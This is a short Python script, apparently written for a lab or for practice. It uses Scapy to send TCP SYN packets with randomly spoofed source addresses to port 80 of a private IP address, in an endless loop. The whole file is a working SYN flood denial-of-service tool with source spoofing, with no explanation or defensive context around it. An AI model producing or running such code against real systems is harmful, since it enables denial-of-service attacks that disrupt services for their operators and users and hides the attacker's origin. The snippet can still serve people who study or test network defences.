from scapy.all import *

def tcp_syn(ip_address,sport,dport):
	s_addr = RandIP()
	d_addr = ip_address

	packet = IP(src=s_addr,dst=d_addr)/TCP(sport=sport,dport=dport,seq=1505066,flags="S")
	send(packet)

while(True):
	tcp_syn("172.20.10.7",1234,80)
